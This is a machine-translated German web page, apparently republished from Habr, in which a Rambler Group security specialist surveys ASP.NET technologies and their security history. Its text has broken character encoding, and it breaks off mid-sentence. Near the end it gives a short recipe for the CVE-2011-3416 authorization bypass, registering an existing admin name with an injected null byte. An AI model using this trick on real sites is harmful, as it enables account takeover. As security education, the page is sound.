<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßëüèΩ‚Äçü§ù‚Äçüßëüèª üçé ‚úäüèΩ Ist es m√∂glich, die ASP-Infrastruktur zu hacken? üö£ ü§üüèº üê§</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Experten f√ºr Informationssicherheit sagen: "Sie brechen alles, jeden und immer." Gleichzeitig sind Angriffe auf ASP.NET selten. Daher ist es immer seh...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Ist es m√∂glich, die ASP-Infrastruktur zu hacken?</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/rambler-co/blog/413649/"><img src="https://habrastorage.org/webt/lw/h4/e6/lwh4e6eo0ogtcv4ycwp2oy_6pa0.jpeg"><br><br>  Experten f√ºr Informationssicherheit sagen: "Sie brechen alles, jeden und immer."  Gleichzeitig sind Angriffe auf ASP.NET selten.  Daher ist es immer sehr neugierig, etwas Neues dar√ºber zu erfahren.  Unter dem Strich die Geschichte von Aleksey Morozov, Spezialist der Informationssicherheitsabteilung der Rambler Group, √ºber die St√§rken und Schw√§chen dieser Technologie. <a name="habracut"></a><br><br><h3>  <font color="#0000cc">Einf√ºhrung</font> </h3><br>  Heute hat sich ASP seine Popularit√§t als Werkzeug zur Erstellung mittlerer und gro√üer Projekte verdient.  Und wie jede g√§ngige L√∂sung ist auch ASP.NET f√ºr externe Sicherheitsforscher, Hacker und Tester von Interesse. <br><br>  Dieser Artikel beschreibt m√∂gliche ASP.NET-Sicherheitsprobleme in verschiedenen Versionen.  Es sollte jedoch beachtet werden, dass ASP in der Anzahl der L√∂sungen f√ºr dasselbe PHP viel schlechter ist, und dies ist auf viele Faktoren zur√ºckzuf√ºhren. <br><br>  Im Gegensatz zu PHP ist die Verwendung von ASP normalerweise viel komplizierter und kostspieliger (unter Verwendung der kommerziellen Version von IIS, der Visual Studio-Entwicklungsumgebung).  Bis vor kurzem (dem Aufkommen von ASP.NET Core) war die Verwendung nur unter Windows und auf dem IIS-Webserver m√∂glich.  Die Bereitstellung ist auch komplizierter. <br><br>  <b><b>ASP</b></b> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Active Server Pages</a> ) ist die Technologie von Microsoft zum Erstellen dynamischer Seiten. <br><br>  <b>Beschreibung:</b> Diese Technologie erm√∂glicht das Erstellen von HTML-Seiten mit Einf√ºgungen in der Jscript-Sprache (sehr √§hnlich zu JavaScript, bietet jedoch zus√§tzlich zu Client-Skripten eine Reihe von Optionen f√ºr die Arbeit mit dem Windows-Betriebssystem und Server-Einf√ºgungen unter ASP). <br><br>  <u><b>Ein Beispiel</b></u> : <br><br><pre><code class="hljs pgsql">&lt;% @ <span class="hljs-keyword"><span class="hljs-keyword">Language</span></span> = "JScript" %&gt;&lt;% Response.<span class="hljs-keyword"><span class="hljs-keyword">Write</span></span>("Hello World!"); %&gt;</code> </pre> <br>  <b>ASP.NET</b> <br><br>  Die n√§chste Runde der Technologieentwicklung war die Erstellung des ASP-Kernels basierend auf dem .Net-Framework.  Als Ergebnis erhielt ASP alle Funktionen dieser L√∂sung, n√§mlich: <br><br><ul><li>  Verwendung verschiedener Programmiersprachen (C #, Visual Basic.NET, J # und JScript .NET); </li><li>  h√∂here Geschwindigkeit im Vergleich zu Skripttechnologien, da der Code zum ersten Mal kompiliert und in einem speziellen Cache abgelegt und anschlie√üend nur ohne zeitaufw√§ndige Analyse optimiert wird; </li><li>  kompilierter Code, mit dem Sie Fehler besser abfangen k√∂nnen, sodass der Debugging-Prozess selbst effizienter wird. </li><li>  die F√§higkeit, die Seite zwischenzuspeichern; </li><li>  Trennung von Pr√§sentation und Gesch√§ftslogik. </li></ul><br>  Basierend auf der ASP.NET-L√∂sung wurden die folgenden Technologien erstellt, die wir ber√ºcksichtigen werden. <br><br>  <b>ASP.NET Ajax</b> ist eine der ASP.NET-Erweiterungen, mit denen Sie mit Ajax einen Teil des Inhalts asynchron aktualisieren k√∂nnen. <br><br>  <b><u>Ein Beispiel</u></b> : <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Refresh"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:UpdatePanel</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"UpdatePanel1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Triggers</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:AsyncPostBackTrigger</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ControlID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">EventName</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Click"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Triggers</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentTemplate</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%=</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">DateTime.Now</span></span></span><span class="hljs-tag"> %&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentTemplate</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:UpdatePanel</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <b>ASP.NET Web Forms</b> - eine neue Entwicklung der ASP-Technologie, bei der ein √úbergang zu einem komponentenorientierten Modell zum Erstellen von Anwendungen erfolgt. <br><br>  <b>Beschreibung:</b> <br><br>  Das Web Forms-Modell basiert auf drei Grundkonzepten: Seiten-Postback, Ansichtsstatus und Serversteuerelemente.  Jede an den Webserver gesendete und der ASP.NET-Laufzeit zugeordnete HTTP-Anforderung durchl√§uft mehrere Phasen, in denen die Verarbeitung des Postback-Ereignisses im Mittelpunkt steht.  Das Postback-Ereignis ist die Hauptaktion, die der Benutzer aufgrund der Verarbeitung seiner Anforderung erwartet.  (z. B. auf eine Schaltfl√§che klicken). <br><br>  Einfach ausgedr√ºckt gibt es traditionelle Steuerelemente (Steuerelemente) und ein ereignisgesteuertes Entwicklungsmodell. <br><br>  <b><u>Ein Beispiel</u></b> : <br><br>  Die Ansicht (Aspx-Datei) ist die Client-Seite. <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%@</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Page</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Language</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"C#"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">CodeFile</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SamplePage.aspx.cs"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Inherits</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SamplePage"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">AutoEventWireup</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> %&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>Code-Behind Page Model<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"form1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Label</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Label1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Label"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Label</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onclick</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1_Click"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Logikverarbeitung (cs-Datei (bei Verwendung von C #)) - serverseitig. <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI.WebControls; <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> partial <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> SamplePage : <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI.Page { protected <span class="hljs-type"><span class="hljs-type">void</span></span> Button1_Click(<span class="hljs-keyword"><span class="hljs-keyword">object</span></span> sender, EventArgs e) { Label1.Text = "Clicked at " + DateTime.Now.ToString(); } }</code> </pre><br>  <b>Die ASP.NET-Web-API</b> ist eine weitere Erweiterung, mit der Sie API-Services f√ºr eine bequemere Entwicklung und Interaktion mit der Anwendung erstellen k√∂nnen. <br><br>  <b><u>Ein Beispiel</u></b> : <br><br><pre> <code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta">HttpDelete(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"{id}"</span></span></span><span class="hljs-meta">)</span></span>] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> IActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Delete</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> id</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> todo = _context.TodoItems.Find(id); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (todo == <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> NotFound(); } _context.TodoItems.Remove(todo); _context.SaveChanges(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> NoContent(); }</code> </pre><br>  <b>ASP.NET MVC</b> - Die n√§chste Stufe in der Entwicklung der Technologie erfolgt nach der Trennung der Gesch√§ftslogik in drei Komponenten des MVC-Musters (Model-View-Controller).  Die Razor Engine wird ebenfalls eingef√ºhrt und es wird m√∂glich, die verwalteten Elemente der Site unabh√§ngig anzupassen, was mit Web Forms sehr schwierig war. <br><br>  <b>Vorteile</b> : <br><br><ul><li>  Die Verwaltung komplexer Strukturen wird erleichtert, indem die Anwendung in ein Modell, eine Pr√§sentation und einen Controller unterteilt wird. </li><li>  Ansichtsstatus und Serverformulare werden nicht verwendet.  Dies macht die MVC-Plattform ideal f√ºr Entwickler, die eine vollst√§ndige Kontrolle √ºber das Anwendungsverhalten ben√∂tigen. </li><li>  Die Hauptsteuerungsschaltung, in der Webanwendungsanforderungen √ºber eine einzelne Steuerung verarbeitet werden.  Auf diese Weise k√∂nnen Sie Anwendungen erstellen, die eine erweiterte Routing-Infrastruktur unterst√ºtzen. </li><li>  Gut geeignet f√ºr Webanwendungen, die von gro√üen Entwicklungsteams unterst√ºtzt werden. </li></ul><br>  <b><u>Ein Beispiel</u></b> : <br><br>  <b>Anzeigen</b> <br><br><pre> <code class="hljs xml">@{ Layout = null; } <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"viewport"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">content</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"width=device-width"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>SomeView<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span>@ViewBag.Message<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <b>Modell</b> <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel.DataAnnotations; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">MvcModels.Models</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">partial</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">User</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> UserId { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">""</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> FirstName { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">""</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> LastName { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">" "</span></span>)] [DataType(DataType.Date)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> DateTime BirthDate { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } } }</code> </pre><br>  <b>Controller</b> <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.Web.Mvc; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">NonCompiledMvc.Controllers</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">HomeController</span></span> : <span class="hljs-title"><span class="hljs-title">Controller</span></span> { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> ActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Index</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> View((<span class="hljs-keyword"><span class="hljs-keyword">object</span></span>)<span class="hljs-string"><span class="hljs-string">"It Works!"</span></span>); } } }</code> </pre><br>  <b>ASP.NET Core</b> - Der n√§chste Durchbruch in ASP.NET wird plattform√ºbergreifend mit Unterst√ºtzung f√ºr C # 7.0. <br><table><tbody><tr><th>  Technologie </th><th>  Starke Seiten </th><th>  Schw√§chen </th></tr><tr><td>  Aktive Serverseiten, ASP </td><td>  Gemeinsames Ziel </td><td>  Zur Laufzeit interpretiert, unterst√ºtzt "Spaghetti-Code" </td></tr><tr><td>  ASP.NET Web Forms 1.0 / 1.1 </td><td>  Die kompilierte Benutzeroberfl√§che unterst√ºtzt OOP </td><td>  Starker Durchsatz, komplexes HTML, nicht testbar </td></tr><tr><td>  ASP.NET Web Forms 2.0 </td><td>  - - </td><td>  - - </td></tr><tr><td>  ASP.NET Ajax </td><td>  Ajax-Implementierung </td><td>  Unangemessene Komplexit√§t, mangelnde Flexibilit√§t </td></tr><tr><td>  ASP.NET Web Forms 3.5-4.0 </td><td>  - - </td><td>  - - </td></tr><tr><td>  ASP.NET MVC 1.0-5.0 </td><td>  Das Entwicklungsmodell √§ndert sich komplett.  Es gibt Flexibilit√§t </td><td>  Das Fehlen einer plattform√ºbergreifenden.  Kann nicht im laufenden Betrieb kompiliert werden </td></tr><tr><td>  ASP.NET Core </td><td>  Plattform√ºbergreifend wird angezeigt.  Open Source </td><td>  - - </td></tr></tbody></table><br><h3>  <font color="#0000cc">Authentifizierung in ASP.NET</font> </h3><br>  In ASP.NET MVC gibt es drei Arten der Authentifizierung, die sich erheblich voneinander unterscheiden. <br><br><ul><li>  <b>Keine Authentifizierung:</b> ASP.NET-Identit√§t und kein integriertes Authentifizierungssystem; </li><li>  <b>Einzelne Benutzerkonten: Das</b> Projekt enth√§lt standardm√§√üig das ASP.NET-Identit√§tssystem, mit dem Sie Benutzer sowohl innerhalb der Anwendung als auch mithilfe externer Dienste wie Google, Twitter usw. autorisieren k√∂nnen. </li><li>  <b>Organisationskonten:</b> geeignet f√ºr Websites und Webanwendungen einzelner Unternehmen und Organisationen; </li><li>  <b>Windows-Authentifizierung:</b> Ein Authentifizierungssystem f√ºr Intranet-Netzwerke mit Windows-Konten. </li></ul><br><img src="https://habrastorage.org/webt/wr/rz/o4/wrrzo4fj86bsayurdvfxzcmdvze.png"><br><br><h3>  <font color="#0000cc">ASP.NET in Bezug auf Hacking</font> </h3><br>  Wie jede Technologie wurde ASP.NET gehackt.  Im Folgenden werden die beliebtesten Sicherheitsstudien beschrieben, nicht nur in ASP selbst, sondern auch in Verbindung mit der Infrastruktur. <br><br>  <b>CVE-Statistiken</b> <br><br><img src="https://habrastorage.org/webt/af/at/ft/afatftxyrlf1kds_37latbgi3fc.png"><br><br>  Wie aus der Tabelle hervorgeht, gibt es nur sehr wenige Statistiken zu Funden.  Dies liegt daran, dass ASP.NET gute Kenntnisse erfordert, um es im Detail zu untersuchen.  Und auch die Ressourcen daf√ºr sind viel geringer als auf demselben PHP. <br><br>  <b>Verwenden eines Null-Bytes f√ºr die Autorisierungsumgehung</b> <br><br>  <b>CVE:</b> CVE-2011-3416 <br>  <b>Beschreibung: Die</b> Autorisierung kann umgangen werden. <br><br>  <b>Algorithmus:</b> <br><br><ol><li>  Registrieren Sie ein neues Konto mit einem vorhandenen Benutzernamen. </li><li>  F√ºgen Sie bei der Registrierung Null-Byte und zus√§tzliche Zeichen hinzu (admin% 0012sd). </li><li>  Somit wird die Eindeutigkeitspr√ºfung bestanden.  Ein neuer "Administrator" -Benutzer wird mit derselben Rolle, jedoch mit einem neuen Kennwort erstellt. </li></ol><br>  <u><b>Beispiel f√ºr anf√§lligen 